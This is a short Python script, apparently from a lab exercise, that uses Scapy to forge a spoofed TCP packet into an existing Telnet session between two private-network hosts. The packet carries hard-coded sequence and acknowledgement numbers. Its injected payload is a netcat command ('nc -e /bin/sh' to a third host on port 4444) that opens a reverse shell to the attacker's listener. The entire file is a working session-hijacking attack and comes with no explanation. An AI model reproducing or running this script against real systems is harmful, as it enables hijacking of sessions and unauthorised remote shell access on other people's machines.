#!/user/bin/python
import sys
from scapy.all import *

IPLayer = IP (src="10.10.10.188", dst = "10.10.10.195")
TCPLayer = TCP (sport=60840, dport=23, flags="A", seq=219454568, ack=157833944)

data = "\n nc -e /bin/sh 10.10.10.186 4444 \n"

pkt=IPLayer/TCPLayer/data
ls(pkt)
send(pkt,verbose=0)
